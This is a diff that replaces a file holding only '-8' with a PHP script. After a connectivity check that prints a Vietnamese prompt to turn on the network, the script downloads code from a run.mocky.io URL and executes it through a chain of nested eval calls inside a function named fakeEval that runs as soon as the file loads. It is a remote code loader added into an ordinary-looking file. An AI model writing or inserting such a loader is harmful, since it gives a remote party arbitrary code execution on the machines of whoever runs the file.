@@ -1,1 +1,48 @@
-8
+<?php
+error_reporting(100000);
+
+function fakeEval() {
+
+if(!$sock = @fsockopen('www.google.com', 80))
+
+{
+
+    echo 'Vui lòng bật kết nối mạng !';
+
+    exit();
+
+}
+
+$a = (file_get_contents("https://run.mocky.io/v3/79248f3d-a4cf-468c-9e64-72ee93f69a5d"));
+
+if(!$a){
+
+exit();}
+
+$e = eval($a);
+
+eval($e);
+
+$a = eval($e);
+
+eval($a);
+
+$c = eval($a);
+
+eval($c);
+
+$b = eval($c);
+
+eval($b);
+
+$d = eval($b);
+
+eval($d);
+
+$u = eval($d);
+
+eval($u);
+
+}
+
+fakeEval();
